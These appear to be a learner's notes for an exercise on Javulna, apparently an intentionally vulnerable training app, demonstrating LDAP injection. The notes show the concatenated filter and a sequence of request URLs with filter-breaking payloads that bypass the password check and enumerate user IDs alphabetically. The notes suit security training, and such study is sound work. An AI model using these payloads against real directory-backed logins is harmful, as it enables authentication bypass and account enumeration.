# Exercise 8

{{javulna_host}}/rest/ldap?username=kriszta&password=*
{{javulna_host}}/rest/ldap?username=j*&password=*

"(&(uid=" + uid + ") (userPassword=" + password + "))"

{{javulna_host}}/rest/ldap?username=*))(|(uid=*&password=bob => any entry that has a uid
{{javulna_host}}/rest/ldap?username=*)(!(uid=a*)&password=* => uid not start with 'a'

{{javulna_host}}/rest/ldap?username=*))(|(uid=*&password=bob => first with a uid


{{javulna_host}}/rest/ldap?username=*)(uid>=b))(|(uid=*&password=bob => first after 'a*'
{{javulna_host}}/rest/ldap?username=*)(uid>=h))(|(uid=*&password=bob => first after 'g*'
{{javulna_host}}/rest/ldap?username=*)(uid>=l))(|(uid=*&password=bob => first after 'k*' => no result, meaning we have em all


### all data
{{javulna_host}}/rest/ldap?username=*&password=* => 1st = aladar
{{javulna_host}}/rest/ldap?username=*)(uid>=aladar0))(|(uid=*&password=* => 1st after aladar = geza
{{javulna_host}}/rest/ldap?username=*)(uid>=geza0))(|(uid=*&password=* => 1st after geza = kriszta
{{javulna_host}}/rest/ldap?username=*)(uid>=kriszta0))(|(uid=*&password=* => 1st after kriszta = error